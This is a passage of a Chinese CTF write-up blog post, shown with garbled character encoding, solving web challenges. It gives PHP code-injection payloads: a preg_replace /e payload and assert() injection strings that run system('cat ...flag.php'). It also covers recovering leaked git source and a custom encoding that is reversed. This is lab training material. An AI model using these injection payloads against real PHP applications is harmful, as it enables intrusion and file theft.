class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>å…³é”®éƒ¨åˆ†å°±æ˜¯æœ€åçš„å†…éƒ¨åŠŸèƒ½ï¼Œpayloadï¼š</p>
<ol>
<li><p>XFF å¤´æ˜¯<code>127.0.0.1</code>ï¼Œå¾ˆå¤šæ’ä»¶éƒ½å¯ä»¥å®ç°<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210831154447334.png" alt="image-20210831154447334"></p>
</li>
<li><p><code>preg_replace($pattern, $replacement, $subject);</code>å‡½æ•°ä½¿ç”¨ <code>/e</code>æ¨¡å¼ï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œçš„é—®é¢˜<br>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/07/preg_replace.html">PHP preg_ç³»åˆ—æ¼æ´å°ç»“ | å›½å…‰ (sqlsec.com)</a></p>
</li>
<li><p>æ‰€ä»¥<code>?pat=/1/e&amp;rep=system(&#39;cat s3chahahaDir/flag/flag.php&#39;)&amp;sub=1</code><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210831164502945.png" alt="image-20210831164502945"></p>
</li>
</ol>
<h3 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h3><p>gitæ³„éœ²ï¼Œç”¨Githackå¾—åˆ°åŸå§‹ç»“æ„ç›®å½•çš„æºç </p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210820153749371.png" alt="image-20210820153749371"></p>
<p>æ‰“å¼€flag.phpæ²¡æœ‰å‘ç°flagï¼Œåº”è¯¥æ˜¯åˆ æ‰äº†ï¼Œä½†æ˜¯ä½ç½®åº”è¯¥è¿˜æ˜¯æ²¡å˜ï¼Œå¯¹index.phpæºç å®¡è®¡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;page&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">	$page &#x3D; $_GET[&#39;page&#39;];</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	$page &#x3D; &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;templates&#x2F;&quot; . $page . &quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; I heard &#39;..&#39; is dangerous!</span><br><span class="line">assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; TODO: Make this look nice</span><br><span class="line">assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>aseertå‡½æ•°å¯ä»¥ä»»æ„æ‰§è¡Œä»£ç ï¼Œ<code>or die()</code>æŒ‡çš„æ˜¯å¦‚æœå‰é¢çš„å€¼ä¸ºfalseåˆ™æ‰§è¡Œæ‹¬å·é‡Œé¢çš„å†…å®¹ï¼Œä¸¤ä¸ªaseertéƒ½èƒ½åˆ©ç”¨ï¼š</p>
<ol>
<li><code>?page=1&#39;,&#39;2&#39;) === false and highlight_file(&#39;templates/flag.php&#39;) and strpos(&#39;templates/flag</code></li>
<li><code>?page=&#39;).system(&quot;cat%20templates/flag.php&quot;);//</code></li>
</ol>
<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>ä»£ç å®¡è®¡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$miwen&#x3D;&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;</span><br><span class="line"></span><br><span class="line">function encode($str)&#123;</span><br><span class="line">    $_o&#x3D;strrev($str);</span><br><span class="line">    &#x2F;&#x2F; echo $_o;</span><br><span class="line">        </span><br><span class="line">    for($_0&#x3D;0;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c&#x3D;substr($_o,$_0,1);</span><br><span class="line">        $__&#x3D;ord($_c)+1;</span><br><span class="line">        $_c&#x3D;chr($__);</span><br><span class="line">        $_&#x3D;$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">    return str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#x2F;*</span><br><span class="line">   é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag</span><br><span class="line">*&#x2F;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æ€è·¯å·²ç»å¾ˆæ˜ç¡®äº†ï¼Œå°±æ˜¯é€†å‘è§£å¯†<code>$miwen</code>ã€‚</p>
<p>å…ˆæŠŠå˜é‡å‘½åç»™æ”¹äº†ï¼Œç„¶åé€†å‘è§£å¯†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">function decode($miwen)&#123;</span><br><span class="line">   $mingwen&#x3D;&#39;&#39;;</span><br><span class="line">   $miwen&#x3D;base64_decode(strrev(str_rot13($miwen)));</span><br><span class="line">   $strrev&#x3D;strrev($miwen);</span><br><span class="line">   for ($i&#x3D;0; $i &lt; strlen($strrev); $i++) &#123; </span><br><span class="line">       </span><br><span class="line">   	    $char&#x3D;substr($strrev,$i,1);  </span><br><span class="line">        $ordchar&#x3D;ord($char)-1;  </span><br><span class="line">        $char&#x3D;chr($ordchar);  </span><br><span class="line">        $mingwen&#x3D;$mingwen.$char;</span><br><span class="line">       </span><br><span class="line">   &#125;</span><br><span class="line">   return $mingwen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$miwen&#x3D;&#39;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#39;;</span><br><span class="line">echo decode($miwen);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>Copyrightï¼š </strong>
          
          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        åˆ†äº«
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>æ‰«ä¸€æ‰«ï¼Œåˆ†äº«åˆ°å¾®ä¿¡</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://sun-ruijiang.github.io/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/" alt="å¾®ä¿¡åˆ†äº«äºŒç»´ç ">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
    
      <a href="/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/" class="article-nav-link">
        <strong class="article-nav-caption">ä¸‹ä¸€ç¯‡</strong>
        <div class="article-nav-title">CTFæ”»é˜²ä¸–ç•Œwebæ–°æ‰‹åŒº2</div>
      </a>
    
  </nav>

  
   
     
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2021
        <i class="ri-heart-fill heart_icon"></i> Sung
      </li>
    </ul>
    <!-- <ul>
      <li>
        
        
        
        powered_by
        <span class="division">|</span>
        Theme - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
        
      </li>
    </ul> -->
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzzç»Ÿè®¡ -->
        
      </li>
    </ul>
  </div>
</footer>
      <div class="float_btns">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

      </div>
    </main>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="Sung&#39;s Blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">ä¸»é¡µ</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">å½’æ¡£</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">åˆ†ç±»</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">æ ‡ç­¾</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">å‹é“¾</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">å…³äºæˆ‘</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="Search">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <script>
      if (window.matchMedia("(max-width: 768px)").matches) {
        document.querySelector('.content').classList.remove('on');
        document.querySelector('.sidebar').classList.remove('on');
      }
    </script>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>è¯·æˆ‘å–æ¯å’–å•¡å§~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
      <span class="reward-type">æ”¯ä»˜å®</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
      <span class="reward-type">å¾®ä¿¡</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->


<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: '.tocbot',
    contentSelector: '.article-entry',
    headingSelector: 'h1, h2, h3, h4, h5, h6',
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: 'main',
    positionFixedSelector: '.tocbot',
    positionFixedClass: 'is-position-fixed',
    fixedSidebarOffset: 'auto'
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // sliderå±•å¼€çŠ¶æ€
                // todo: è¿™æ ·ä¸å¥½ï¼Œåé¢æ”¹æˆçŠ¶æ€
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // è·å¾—åŸå›¾å°ºå¯¸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>

<!-- MathJax -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
  var ayerConfig = {
    mathjax: true
  }
</script>

<!-- Katex -->

<!-- busuanzi  -->


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<!-- ClickLove -->

<!-- ClickBoom1 -->

<script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script>

<script src="/js/clickBoom1.js"></script>


<!-- ClickBoom2 -->

<!-- CodeCopy -->


<link rel="stylesheet" href="/css/clipboard.css">

<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // ç­‰å¾…ä¸¤ç§’é’Ÿåæ¢å¤
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // ç­‰å¾…ä¸¤ç§’é’Ÿåæ¢å¤
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>


<!-- CanvasBackground -->


<script src="/js/dz.js"></script>



    
  </div>
</body>

</html>